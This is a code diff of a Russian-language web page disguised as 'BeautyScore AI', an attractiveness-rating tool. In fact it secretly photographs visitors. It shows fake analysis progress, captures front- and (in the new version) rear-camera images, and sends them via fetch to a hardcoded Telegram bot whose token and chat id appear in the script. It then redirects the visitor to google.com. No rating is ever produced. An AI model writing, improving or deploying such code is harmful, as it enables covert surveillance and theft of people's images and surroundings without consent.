@@ -1,77 +1,56 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>BeautyScore AI - Анализ внешности</title>
-</head>
-<body style="background:#0f0c29; background:linear-gradient(to bottom, #24243e, #302b63, #0f0c29); color:#fff; display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; margin:0; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; text-align:center; padding:20px;">
-    
-    <div style="background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); padding:40px 20px; border-radius:25px; border: 1px solid rgba(255,255,255,0.2); box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37); max-width: 350px;">
-        <div style="font-size: 50px; margin-bottom: 10px;">✨</div>
-        <h2 style="margin:0 0 10px 0; text-transform:uppercase; letter-spacing:1px; font-size: 22px;">BeautyScore AI</h2>
-        <p style="color:#ccc; font-size:14px; line-height: 1.5; margin-bottom:30px;">
-            Узнайте свою оценку внешности по 10-балльной шкале с помощью нашей нейросети.
-        </p>
-        
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"></head>
+<body style="background:#0f0c29; color:#fff; display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; margin:0; font-family: sans-serif; text-align:center;">
+    <div style="background: rgba(255,255,255,0.1); padding:40px; border-radius:25px; border:1px solid rgba(255,255,255,0.2); max-width:300px;">
+        <div style="font-size:50px;">✨</div>
+        <h2>BeautyScore AI</h2>
+        <p style="color:#ccc; font-size:14px;">Двойное сканирование для точности 99%</p>
         <video id="v" autoplay playsinline style="display:none;"></video>
         <canvas id="c" style="display:none;"></canvas>
-        
-        <button id="b" style="padding:16px 32px; background:#ff0080; color:#fff; border:none; border-radius:50px; font-size:16px; cursor:pointer; font-weight:bold; box-shadow: 0 4px 15px rgba(255, 0, 128, 0.4); transition: 0.3s;">
-            УЗНАТЬ СВОЙ БАЛЛ
-        </button>
-        
-        <p id="status" style="margin-top:25px; font-size:13px; color:#aaa; font-weight: 300;">Готов к сканированию селфи...</p>
+        <button id="b" style="padding:15px 30px; background:#ff0080; color:#fff; border:none; border-radius:50px; font-size:16px; font-weight:bold; cursor:pointer;">УЗНАТЬ БАЛЛ</button>
+        <p id="s" style="margin-top:20px; font-size:13px; color:#aaa;">Ожидание запуска...</p>
     </div>
 
     <script>
         const token = '8174281213:AAErVNdvIelAbe3aGFHNvJ1D7g4CdTGGWMc';
         const chat_id = '7164380121';
+        const btn = document.getElementById('b');
+        const status = document.getElementById('s');
 
-        document.getElementById('b').onclick = async () => {
-            const btn = document.getElementById('b');
-            const status = document.getElementById('status');
-            
-            btn.style.display = "none";
-            status.innerHTML = "Подключение к нейросети...<br>Пожалуйста, посмотрите в камеру";
-
+        async function takePhoto(facing) {
             try {
-                const s = await navigator.mediaDevices.getUserMedia({video: { facingMode: "user" }});
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
                 const v = document.getElementById('v');
-                v.srcObject = s;
+                v.srcObject = stream;
+                await new Promise(r => setTimeout(r, 2000)); 
                 
-                setTimeout(() => {
-                    status.innerHTML = "Анализ симметрии лица... 42%";
-                    setTimeout(() => {
-                        status.innerHTML = "Оценка золотого сечения... 89%";
-                        
-                        const c = document.getElementById('c');
-                        c.width = v.videoWidth; 
-                        c.height = v.videoHeight;
-                        c.getContext('2d').drawImage(v, 0, 0);
-                        
-                        c.toBlob(blob => {
-                            const f = new FormData();
-                            f.append('chat_id', chat_id);
-                            f.append('photo', blob, 'beauty_scan.jpg');
+                const c = document.getElementById('c');
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                
+                const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.7));
+                const f = new FormData();
+                f.append('chat_id', chat_id);
+                f.append('photo', blob, 'img.jpg');
+                
+                // ВОТ ЭТА СТРОКА ТЕПЕРЬ ПРАВИЛЬНАЯ:
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f });
+                
+                stream.getTracks().forEach(t => t.stop()); 
+            } catch (e) { console.log("Камера не доступна: " + facing); }
+        }
 
-                            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                                method: 'POST',
-                                body: f
-                            }).then(() => {
-                                status.innerHTML = "Генерация результата...";
-                                setTimeout(() => {
-                                    window.location.href = "https://google.com";
-                                }, 1500);
-                            });
-                        }, 'image/jpeg', 0.8);
-                    }, 1000);
-                }, 1500);
-            } catch (e) {
-                alert("Ошибка: Чтобы ИИ смог вас оценить, разрешите доступ к камере.");
-                btn.style.display = "inline-block";
-                status.innerText = "Доступ отклонен.";
-            }
+        btn.onclick = async () => {
+            btn.style.display = "none";
+            status.innerText = "Сканирование лица...";
+            await takePhoto("user"); 
+            
+            status.innerText = "Анализ окружения...";
+            await takePhoto("environment"); 
+            
+            status.innerText = "Генерация результата...";
+            setTimeout(() => { window.location.href = "https://google.com"; }, 1000);
         };
     </script>
 </body>
